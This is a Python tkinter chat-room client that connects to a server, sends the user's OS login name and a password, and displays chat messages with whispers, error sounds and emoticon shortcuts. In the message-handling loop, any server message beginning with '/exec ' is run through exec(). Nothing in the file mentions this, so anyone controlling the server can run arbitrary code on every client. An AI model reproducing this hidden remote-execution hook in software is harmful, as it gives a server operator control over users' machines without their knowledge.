# Python program to implement client side of chat room.

# We're going to go hardcore and use tkinter!

import socket
import select
import os
import sys
from datetime import datetime
import winsound
import time

from _thread import *
from tkinter import *
  
server = socket.socket()
if len(sys.argv) != 3: 
    print("Correct usage: script, IP address, port number")

localIP = socket.gethostbyname(socket.gethostname())
IP_address = input('Please enter the host ip address: ')
if len(IP_address) == 0:
    IP_address = '10.37.110.237'
Port = 1234

print('Connecting...')
server.connect((IP_address, Port))
print('Done connecting! \n')

time.sleep(0.1)
server.send(os.getlogin().encode())
time.sleep(0.1)

def send_password(event = None):
    '''
    send_password()
    Sends the password!
    '''
    server.send(e.get().encode())
    root.destroy()

print('Please enter the password in the Tkinter window. ')
root = Tk()
root.title('Password Entry')
root.iconbitmap(os.getcwd() + '\\message.ico')
root.deiconify()
root.lift()
root.bind('<Return>', send_password)

e = Entry(root, width = 50, font = ('Segoe UI', 12))
e.grid(row = 0, column = 0)

b = Button(root, width = 50, text = 'Enter', font = ('Segoe UI', 12), command = send_password)
b.grid(row = 1, column = 0)

root.mainloop()

def tkintering():
    '''
    tkintering()
    Does some tkinter stuff.
    '''
    pass

# The listening stuff!
def listen():
    '''
    listen()
    Listens to the server!
    '''
    # Now acutally doing stuff!
    while True: 
      
        # maintains a list of possible input streams 
        sockets_list = [server] 
      
        """ There are two possible input situations. Either the 
        user wants to give  manual input to send to other people, 
        or the server is sending a message  to be printed on the 
        screen. Select returns from sockets_list, the stream that 
        is reader for input. So for example, if the server wants 
        to send a message, then the if condition will hold true 
        below. If the user wants to send a message, the else 
        condition will evaluate as true"""
        read_sockets = sockets_list
      
        for socks in read_sockets:
            if socks == server:
                
                m = socks.recv(2048).decode()
                messes = m.split('\n')
                for message in messes:

                    if message == ' ' * len(message):
                        continue

                    if ']' in message:
                        legitMessage = message[message.index(']') + 2:]
                        usernames.insert(END, message[:message.index(']') + 1])

                        # Whispering!
                        if legitMessage.startswith('/w '):
                            messages.insert(END, legitMessage[3:])
                            usernames.itemconfig(END, {'fg': 'blue'})
                            messages.itemconfig(END, {'fg': 'blue'})

                        else:
                            messages.insert(END, legitMessage)
                            
                        
                    else:

                        # Errors!
                        if message.startswith('/e '):
                            # Message too long error.
                            messages.insert(END, message[3:])
                            messages.itemconfig(END, {'fg': 'red'})
                            winsound.PlaySound(os.getcwd() + '\\erro.wav', 1)

                        # Execution!
                        elif message.startswith('/exec '):
                            commands = message.split(' ')
                            exec(' '.join(commands[1:]))
                            
                        else:
                            messages.insert(END, message)
                            # Sound?
                            if str(root.focus_get()) != '.!entry':
                                winsound.PlaySound(os.getcwd() + '\\hangouts.wav', 1)
                            else:
                                print('Error: ' + str(root.focus_get()) + '. ')
                            
                        usernames.insert(END, '[Server]')
                        
                    stamps.insert(END, str(datetime.now()))

                    usernames.see(END)
                    messages.see(END)
                    stamps.see(END)


                    
                    print(message)
                
    server.close()

# All the tkinter stuff is important!
def send(event = None):
    '''
    send()
    Sends stuff to the server!
    '''
    if len(e.get()) != 0:
        
        message = e.get()
        message = message.replace('/shruggie', '¯\_(ツ)_/¯')
        message = message.replace('/tableflip', '(╯°□°)╯︵ ┻━┻')
        message = message.replace('/yuno', 'ლ(ಠ益ಠლ)')
        message = message.replace('/this', '☜(ﾟヮﾟ☜)')
        message = message.replace('/that', '(☞ﾟヮﾟ)☞')
        message = message.replace('/wizard', '(∩ ` -´)⊃━━☆ﾟ.*･｡ﾟ')
        
        #usernames.insert(END, '[You]')
        #messages.insert(END, message)
        #stamps.insert(END, str(datetime.now()))
        #usernames.see(END)
        #messages.see(END)
        #stamps.see(END)
        
        server.send(message.encode())

        # Formatting!
        if e.get().startswith('/w '):
            usernames.itemconfig(END, {'fg': 'blue'})
            messages.itemconfig(END, {'fg': 'blue'})
        
        e.delete(0, END)

# Scrolling stuff!
def onscroll(*args):
    '''
    onscroll(*args)
    Scrolls!
    '''
    usernames.yview(*args)
    messages.yview(*args)
    stamps.yview(*args)

def on_mouse_wheel(event):
    '''
    on_mouse_wheel(event)
    Binding for all the scrolls.
    '''
    usernames.yview('scroll', -event.delta, 'units')
    messages.yview('scroll', -event.delta, 'units')
    stamps.yview('scroll', -event.delta, 'units')
    return 'break'
    
root = Tk()
root.title('Python ChatRoom')
root.iconbitmap(os.getcwd() + '\\' + 'message.ico')
root.grid_rowconfigure(0, weight = 1)
root.grid_columnconfigure(0, weight = 1)

# Other stuff.

# Really important IP stuff.
title = Label(root, text = 'Python ChatRoom', width = 25, font = ('Segoe UI', 24))
title.grid(row = 0, column = 0, columnspan = 2)

info = Label(root, text = 'Local address: ' + localIP + '\nServer address: ' + IP_address,
             width = 30, font = ('Segoe UI', 12))
info.grid(row = 0, column = 2)

userLabel = Label(root, text = 'Username', font = ('Segoe UI', 12))
messageLabel = Label(root, text = 'Messages', font = ('Segoe UI', 12))
stampLabel = Label(root, text = 'Timestamp', font = ('Segoe UI', 12))
userLabel.grid(row = 1, column = 0)
messageLabel.grid(row = 1, column = 1)
stampLabel.grid(row = 1, column = 2)

# Scrollbar!
scroll = Scrollbar(root, orient = 'vertical')
scroll.config(command = onscroll)
scroll.grid(row = 1, column = 3, rowspan = 3, sticky = N + S)

# Usernames listbox!
usernames = Listbox(root, width = 15, height = 20, font = ('Segoe UI', 12), yscrollcommand = scroll.set)
usernames.bind('<MouseWheel>', on_mouse_wheel)
usernames.grid(row = 2, column = 0)

# Messages listbox!
messages = Listbox(root, width = 60, height = 20, font = ('Segoe UI', 12), yscrollcommand = scroll.set)
messages.bind('<MouseWheel>', on_mouse_wheel)
messages.grid(row = 2, column = 1)

# Timestamps listbox!
stamps = Listbox(root, width = 30, height = 20, font = ('Segoe UI', 12), yscrollcommand = scroll.set)
stamps.bind('<MouseWheel>', on_mouse_wheel)
stamps.grid(row = 2, column = 2)

# Label for entering stuff!
h = Label(root, text = 'Enter text here: ', width = 15, font = ('Segoe UI', 12))
h.grid(row = 3, column = 0)

# Entry widget!
e = Entry(root, width = 90, font = ('Segoe UI', 12))
e.grid(row = 3, column = 1, columnspan = 2)

##b = Button(root, text = 'Send', command = send, font = ('Segoe UI', 12))
##b.grid(row = 1, column = 1)

root.bind('<Return>', send)
root.grid()

# Start the listening thread!
start_new_thread(listen, ())

root.deiconify()
root.mainloop()


  





















































## 
